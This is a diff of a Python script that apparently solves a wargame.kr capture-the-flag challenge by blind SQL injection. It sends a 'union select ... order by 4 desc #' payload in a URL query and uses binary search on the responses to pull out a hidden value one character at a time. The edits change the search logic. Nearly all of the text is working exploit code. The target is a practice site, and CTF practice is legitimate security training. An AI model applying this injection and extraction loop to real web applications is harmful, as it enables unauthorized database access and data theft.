@@ -7,7 +7,7 @@ pivot=int((start+end)/2)
 result=''
 middle=''
 count=0
-for i in range(30):
+for i in range(36):
     if start!=0 or end!=len(tmp)-1:
         print('count error')
         break
@@ -28,41 +28,20 @@ for i in range(30):
             print('non error')
             break
         if response.text.find('NOW COUNT = 148') != -1:
-            print('hiru')
             break
         if response.text.find('zairowkdlfhdkel') != -1:
-            start=pivot
+            start=pivot+1
             pivot=int((start+end)/2)
-            if start+1==end:
-                url='http://wargame.kr:8080/zairo?pw=&flag=abs&id='
-                middle=result
-                middle+=tmp[pivot+1]
-                payload=quote(f"zairowkdlfhdkel' union select 1,2,3,'{middle}',5 order by 4 desc #")
-                url+=payload
-                response=get(url=url)
-                count+=1
-                print(response.text)
-                if response.text.find('zairowkdlfhdkel') != -1:
-                    result+=tmp[pivot+1]
-                    start=0
-                    end=len(tmp)-1
-                    pivot=int((start+end)/2)
-                    break
-                else:
-                    result+=tmp[pivot]
-                    start=0
-                    end=len(tmp)-1
-                    pivot=int((start+end)/2)
-                    break
         else:
             end=pivot-1
             pivot=int((start+end)/2)
-            if start==pivot and pivot==end:
-                result+=tmp[pivot]
-                start=0
-                end=len(tmp)-1
-                pivot=int((start+end)/2)
-                break
+        if start > end:
+            result+=tmp[pivot]
+            tmp=tmp.replace(tmp[pivot],'')
+            start=0
+            end=len(tmp)-1
+            pivot=int((start+end)/2)
+            break
 print('결과',result.lower())
 print('자리수',len(result))
 print('사용한 카운트',count)
